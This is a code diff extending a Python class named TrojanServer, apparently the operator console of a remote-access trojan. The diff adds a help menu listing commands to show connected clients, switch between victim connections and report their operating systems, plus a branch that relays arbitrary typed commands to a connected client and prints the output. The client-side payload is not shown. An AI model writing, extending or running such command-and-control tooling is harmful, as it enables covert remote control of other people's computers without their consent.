@@ -38,4 +38,33 @@ class TrojanServer(object):
                     if(t.getName() == tmp[1].strip()):
                         t.join()
             
-            elif
+            elif cmd.lower() == "help" or cmd.lower() == "?":
+                print("Commands:")
+                print("===========")
+                print("show clients         - Shows all connected clients")
+                print("userconn [IP:PORT]   - Switch to the connection")
+                print("tell os              - Show OS of all Clients")
+                print("help                 - Show this help")
+
+            else:
+                try:
+                    b_arr = bytearray()
+                    b_arr.extend(map(ord, cmd))
+                    client.send(b_arr)
+                    
+                    data = client.recv(8192).decode("UTF-8", errors="replace")
+
+                    if data:
+                        print(str(data))
+                        if str(data) == "Bye!":
+                            raise ConnectionError("Client discornnected")
+                    else:
+                        raise ConnectionError("Client discornnected")
+                except ConnectionError:
+                    print("Client", str(adress), "disconnected")
+                    client.close()
+                    return False
+
+if __name__ == "__main__":
+    server = TrojanServer()
+    server.listener()        
